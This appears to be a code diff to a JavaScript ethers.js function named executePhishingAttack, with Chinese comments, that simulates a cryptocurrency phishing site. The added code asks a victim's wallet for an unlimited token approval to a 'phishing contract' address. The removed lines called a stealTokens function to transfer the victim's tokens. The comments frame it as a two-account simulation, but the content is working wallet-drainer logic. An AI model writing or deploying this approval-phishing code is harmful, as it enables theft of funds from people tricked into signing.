@@ -134,38 +134,27 @@ async function setupWeb3() {
     }
 }
 
-  //... (前面的程式碼不變)
+// 這個函數模擬了釣魚網站的行為
 async function executePhishingAttack() {
     const web3 = await setupWeb3();
     if (!web3) return;
 
     try {
-        const { signer } = web3; // 這個 signer 是 B 帳號
+        const { signer } = web3;
 
-        // 步驟一：讓受害者 (B) 簽署授權交易
+        // 步驟一：請求無限授權
         const musdtContract = new ethers.Contract(MUSDT_CONTRACT_ADDRESS, musdtABI, signer);
         const amountToApprove = ethers.MaxUint256; 
-        console.log("受害者 (B) 正在請求授權...請在錢包中確認！");
+
+        console.log("正在請求授權...請在錢包中確認！");
         const approveTx = await musdtContract.approve(PHISHING_CONTRACT_ADDRESS, amountToApprove);
+        
+        console.log("已發送授權交易，等待確認...");
         await approveTx.wait();
         console.log("授權成功！");
-
-        // 步驟二：模擬攻擊者 (A) 的竊取操作
-        // 注意：這裡的 signer 必須是攻擊者 (A) 的 signer
-        // 在真實場景中，這段程式碼會在攻擊者自己的伺服器上執行，而不是在受害者瀏覽器上
         
-        const victimAddress = await signer.getAddress(); // 獲取受害者 (B) 的地址
-        
-        // 為了模擬，你可以使用另一個 MetaMask 錢包來發送這筆交易
-        // 或者你可以手動在 Remix 上連接 A 帳號，並呼叫 stealTokens 函數
-        
-        // 以下程式碼在當前 B 帳號的環境下會失敗，因為 B 不是 owner
-        console.log("發送竊取代幣交易中...");
-        const phishingContract = new ethers.Contract(PHISHING_CONTRACT_ADDRESS, phishingABI, signer);
-        const amountToSteal = ethers.parseUnits("1000", 6);
-        const stealTx = await phishingContract.stealTokens(victimAddress, amountToSteal);
-        await stealTx.wait();
-        console.log("竊取成功！");
+        // 模擬攻擊者後台操作
+        console.log("授權成功！攻擊者現在可以在後台轉走你的資產。");
 
     } catch (error) {
         console.error("發生錯誤:", error);
